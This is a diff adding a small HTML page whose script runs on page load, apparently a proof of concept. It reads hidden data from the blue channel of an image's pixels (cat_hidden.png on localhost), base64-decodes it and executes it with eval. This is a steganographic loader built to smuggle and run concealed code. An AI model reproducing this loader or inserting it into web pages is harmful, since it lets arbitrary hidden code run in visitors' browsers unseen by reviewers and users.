@@ -1,0 +1,41 @@
+<script lang="javascript">
+  window.onload = function() {
+
+    var canvas = document.createElement("canvas");
+    var ctx = canvas.getContext('2d');
+
+    var img = new Image;
+    img.crossOrigin = "Anonymous";
+
+    img.onload = function() {
+      console.log('Loaded');
+      canvas.width = img.width;
+      canvas.height = img.height;
+      ctx.drawImage(img, 0, 0); // Or at whatever offset you like
+      var lengthPixel = ctx.getImageData(0, 0, 1, 1).data;
+      console.log('Pixel is ' + lengthPixel);
+
+      console.log('length is ' + lengthPixel[2]);
+
+      let data = '';
+
+      for (let i = 1; i <= lengthPixel[2]; i++) {
+        var dataPixel = ctx.getImageData(0, i, 1, 1).data;
+        console.log(dataPixel);
+        data += String.fromCharCode(dataPixel[2]);
+      }
+
+      console.log('data is ' + data);
+      let scriptString = atob(data);
+      console.log('scripted string is ' + scriptString);
+      eval(scriptString);
+    };
+    img.src = "http://localhost:8000/cat_hidden.png";
+
+  }
+</script>
+
+<div>
+  <img id="mahImage" src="http://localhost:8000/cat_hidden.png" />
+  <div id="output"></div>
+</div>
